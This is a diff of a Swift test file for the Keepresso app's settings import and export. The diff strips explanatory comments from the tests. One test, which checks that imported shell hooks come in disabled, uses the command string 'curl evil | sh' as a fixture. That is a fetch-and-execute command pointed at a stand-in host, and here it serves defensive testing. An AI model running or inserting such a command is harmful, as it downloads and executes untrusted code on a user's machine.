@@ -43,9 +43,6 @@ import Foundation
 }
 
 @Test func importRejectsAFileThatIsntAKeepressoExport() throws {
-    // A bare KeepressoSettings blob (e.g. the raw UserDefaults value) is valid
-    // JSON but has no envelope, so import must refuse it rather than silently
-    // adopt an unlabelled file.
     let bare = try JSONEncoder().encode(KeepressoSettings.default)
     #expect(throws: SettingsTransferError.unrecognizedFile) {
         try SettingsTransfer.importSettings(from: bare)
@@ -89,14 +86,11 @@ import Foundation
 
     let (disarmed, count) = settings.disarmingImportedShellHooks()
 
-    #expect(count == 1) // only the one enabled shell hook
-    // Enabled shell hook comes in disabled, but is kept (not deleted) with its command intact.
+    #expect(count == 1)
     #expect(disarmed.eventHooks[0].enabled == false)
     #expect(disarmed.eventHooks[0].action == .shell(command: "curl evil | sh"))
-    // Webhook and Shortcut are not silent code execution, so they stay enabled.
     #expect(disarmed.eventHooks[1].enabled == true)
     #expect(disarmed.eventHooks[2].enabled == true)
-    // An already-disabled shell hook stays disabled and isn't counted.
     #expect(disarmed.eventHooks[3].enabled == false)
 }
 
@@ -111,9 +105,6 @@ import Foundation
 }
 
 @Test func importIsForgivingOfAnOlderExportMissingFields() throws {
-    // An export written before a settings field existed must still import,
-    // filling the missing field with its default (the forgiving decoder inside
-    // the envelope). Here the envelope is current but the payload is sparse.
     let json = """
     {
       "format": "\(SettingsTransfer.formatName)",
@@ -124,6 +115,6 @@ import Foundation
     let imported = try SettingsTransfer.importSettings(from: Data(json.utf8))
     #expect(imported.triggersEnabled == true)
     #expect(imported.showCountdownInMenuBar == true)
-    #expect(imported.startOnLaunch == false) // absent -> default
+    #expect(imported.startOnLaunch == false)
     #expect(imported.hotKey == nil)
 }
